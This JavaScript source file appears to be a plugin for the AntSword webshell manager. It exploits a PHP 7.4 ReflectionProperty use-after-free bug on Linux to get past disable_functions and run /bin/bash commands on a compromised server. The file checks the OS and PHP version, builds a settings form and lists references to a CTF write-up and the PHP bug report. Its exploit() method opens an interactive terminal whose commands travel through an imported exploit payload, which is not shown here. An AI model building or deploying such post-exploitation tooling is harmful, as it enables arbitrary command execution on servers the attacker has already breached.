'use strict';

const Base = require('../base');
const LANG = require('../../language'); // 插件语言库
const LANG_T = antSword['language']['toastr']; // 通用通知提示
const nodeurl = require('url');
const {
    PHP7_ReflectionProperty_UAF_EXP
} = require('../../payload');
let PHP7_ReflectionProperty_UAF_LANG = LANG['core']['php7_reflectionproperty_uaf'];

class PHP7_ReflectionProperty_UAF extends Base {
  /**
   * 
   * @param {dhtmlxObject} cell 组件
   * @param {Object} top 上层对象
   */
  constructor(cell, top) {
    super(cell, top);
    if (this.precheck() == false) {
      return;
    }
    this.infodata = {
      ver: this.top.infodata.ver,
    };
    this.cell = cell;
    this.form = this.createForm(this.cell);
  }

  // 提前检测
  precheck() {
    let self = this;
    let infodata = self.top.infodata;
    if (infodata.os.toLowerCase() !== "linux") {
      toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
      return false;
    }
    if (infodata.ver != "7.4") {
      toastr.error(PHP7_ReflectionProperty_UAF_LANG['err']['phpvererr'], LANG_T['error']);
      return false;
    }
    // TODO: 检查详细版本号
    return true;
  }

  createForm(cell) {
    let self = this;
    let form = cell.attachForm([{
        type: 'settings',
        position: 'label-left',
        labelWidth: 100,
        inputWidth: 300,
      }, {
        type: 'block',
        inputWidth: 'auto',
        list: [{
          type: 'label',
          labelWidth: 300,
          label: PHP7_ReflectionProperty_UAF_LANG['title']
        }, {
          type: 'block',
          inputWidth: 'auto',
          list: [{
              type: 'settings'
            },
            {
              type: "label",
              label: `<span>${PHP7_ReflectionProperty_UAF_LANG['status_cell']['ver']}</span>`,
            },
            {
              type: "newcolumn"
            },
            {
                type: "label",
                labelWidth: 300,
                label: `7.4 <= 7.4.8`,
            },
          ],
        }]
      },
      {
        type: 'block',
        labelWidth: 100,
        inputWidth: 'auto',
        className: "display: flex;flex-direction: row;align-items: center;",
        list: [{
          type: 'label',
          label: '',
          name: 'status_label'
        }, {
          type: 'newcolumn',
          offset: 20
        }, {
          type: 'label',
          label: '',
          name: 'status_msg'
        }, ]
      },
      {
        type: 'block',
        inputWidth: 'auto',
        list: [{
          type: 'template',
          label: "Reference",
          style: "width:100%;",
          format: references
        }, ]
      }
    ], true);
    return form;
  }

  // 执行EXP, 必须有这个函数
  exploit() {
    let self = this;
    self.core = self.top.core;
    new antSword.module.terminal(self.top.opt, {
      exec: (arg = {
        bin: '/bin/bash',
        cmd: ''
      }) => {
        return {
          _: PHP7_ReflectionProperty_UAF_EXP(arg['bin'], arg['cmd']),
        }
      }
    });
  }
}

function references(name, value) {
  let refs = {
    "2020YCBCTF/Break_the_Wall": "https://github.com/gwht/2020YCBCTF/tree/main/wp/web/break_the_wall",
    "Bug #79820	Use after free when type duplicated into ReflectionProperty gets resolved": "https://bugs.php.net/bug.php?id=79820",
  };
  let ret = "";
  Object.keys(refs).map((k) => {
    ret += `<li style="padding-bottom: 10px;"><a href='${refs[k]}' target='blank'>${k}</a></li>`;
  })
  return `<div class='simple_link'><ul>${ret}</ul></div>`;
}

module.exports = PHP7_ReflectionProperty_UAF;